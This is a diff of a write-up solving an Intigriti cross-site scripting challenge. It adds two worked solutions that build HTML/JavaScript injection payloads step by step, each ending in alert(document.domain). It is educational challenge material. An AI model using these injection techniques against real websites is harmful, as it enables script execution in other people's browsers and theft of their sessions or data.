@@ -196,7 +196,7 @@ if (c.id === "intigriti") {
 Let's try insert a simple payload with id `intigriti`
 
 ```cs
-?html=</h1></div><div id="intigriti"><script></div&xss=xss
+?html=</h1></div><div id="intigriti"><script>&xss=xss
 ```
 
 The variable `f` will contain the value **"tml>"** after using the **substr()** function to retrieve the last four characters from the variable `i`.
@@ -218,19 +218,79 @@ Since we can manipulate the 4 characters. There are 2 ways that we can try and w
 
 #### Solution 1
 
-The first solution we want to try store it into a varialble. Luckily, all the tag will auto closed. So let's just focus on the tag that could have single quote ('). The payload that we can try as follows:
+The first solution we want to try store it into a variable. Fortunately, all the tags will automatically close, so we only need to focus on the tags that may contain a single quote ('). The payload I initially attempted is as follows.
 
 ```html
-?html=</h1></div><div id="intigriti"><dd><a='><script>&xss=xss
+?html=</h1></div><div id="intigriti"><a='><script>&xss=xss
 ```
+
+But we still can't have the `a='>` yet as our 4 characters. 
 
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_9.png)
 
+When we add another tag before `<a='>`, it seems like we manage to get what we want
 
+```html
+?html=</h1></div><div id="intigriti"><nothing><a='><script>&xss=xss
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_10.png)
+
+The final payload we just need to add necessary codes to execute our XSS payload `alert(document.domain)` using the `xss` parameter as follows:
+
+```html
+?html=</h1></div><div id="intigriti"><nothing><a='><script>&xss=;alert(document.domain)
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_11.png)
+
+```html
+<script type="text/javascript">a='>)]}';alert(document.domain)</script>
+```
 
 #### Solution 2
 
+In the second solution, our goal is to ensure that our payload does not break the JavaScript code, while also do not need storing the value in a variable. To achieve this, let's reassess our situation. Assume we have the following code:
 
+```html
+<script type="text/javascript">
+	)]}'
+</script>
+```
+
+When we run the **HTML** file as shown above, we will encounter an error: `Uncaught SyntaxError: expected expression, got ')'`. To address this issue, let's attempt to add a `(` character infront.
+
+```html
+<script type="text/javascript">
+	())]}'
+</script>
+```
+
+Upon making the suggested modification, we will encounter a different error: `Uncaught SyntaxError: unexpected token: ')'`. In the given scenario, let's assume we need to add a tag, such as `<aa>`. By doing so, we will obtain a value of `/aa>` for the four characters. Now, let's proceed to add a bracket within this payload.
+
+```html
+?html=</h1></div><div id="intigriti"><nothing><a(><script>&xss=xss
+```
+
+We will get as follows. Also, we only have this error `Uncaught SyntaxError: unterminated regular expression literal`.
+
+```html
+<script type="text/javascript">/a(>)]}'xss</script>
+```
+
+It appears that the provided expression is being interpreted as a regular expression. Therefore, with the current payload of `/a(>)]}'xss`, we need to include another `/` at the end to properly close the regular expression.  More information on this issue can be found in [here](https://stackoverflow.com/questions/56526366/how-to-fix-unterminated-regular-expression-literal-error-in-javascript) . Thus, our final payload will be as follows.
+
+```html
+?html=</h1></div><div id="intigriti"><nothing><a(><script>&xss=/;alert(document.domain)
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_12.png)
+
+```html
+<script type="text/javascript">/a(>)]}'/;alert(document.domain)</script>
+```
+
+It was an intriguing challenge that helped me learn many new things!
 
 ## References
 
